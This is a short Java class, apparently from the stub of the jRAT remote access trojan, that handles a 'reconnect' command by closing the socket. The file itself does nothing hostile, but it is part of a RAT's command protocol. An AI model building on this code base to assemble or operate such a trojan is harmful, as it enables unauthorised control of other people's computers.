package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet45Reconnect extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.getSocket().close();
	}

}
